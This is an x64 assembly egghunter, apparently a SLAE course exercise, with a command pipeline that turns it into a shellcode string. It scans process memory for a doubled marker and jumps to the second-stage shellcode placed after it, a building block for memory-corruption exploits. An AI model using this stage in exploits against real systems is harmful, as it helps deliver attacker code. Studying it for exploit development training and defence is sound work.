; Filename:      egghunter.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  30.01.2019
; Note:          x64
; Assembler:     nasm -f elf64 egghunter.nasm -o egghunter.o
; Linker:        ld -m elf_x86_64 egghunter.o -o egghunter
; Assembly dump: objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	xor r8, r8          ; Clear r8 register
	xor rsi, rsi        ; Clear rsi register
	xor rdi, rdi        ; Clear rdi register
	mov r8d,0x50905090  ; Set Egg: X,NOP,X,NOP
	xor rcx,rcx         ; Clear rcx register
	mul rcx             ; Clear rax & rdx registers

next_page:

	or dx,0xfff         ; Memory alignment, next inc instruction +0x1000

next_address:
; Check if memory address is readable (sys_access)
; int access(const char *pathname, int mode);
	inc rdx             ; rdx + 1

	lea rdi,[rdx+0x4]   ; Next for bytes
	xor rax, rax        ; Clear rax register
	mov al, 21          ; sys_access
	syscall

	cmp al,0xf2         ; Compare return in al of sys_access with 0xf2 (EFAULT) and set ZF flag
	jz next_page        ; if EFAULT jump to nextpage
	cmp [rdx],r8d       ; Compare rdx address with egg
	jnz next_address    ; If no egg jump to inc rdx
	cmp [rdx+0x4],r8d   ; Compare next four bytes for our double eggs
	jnz next_address    ; If not second egg jump to next address
	jmp rdx             ; Start second stage shellcode
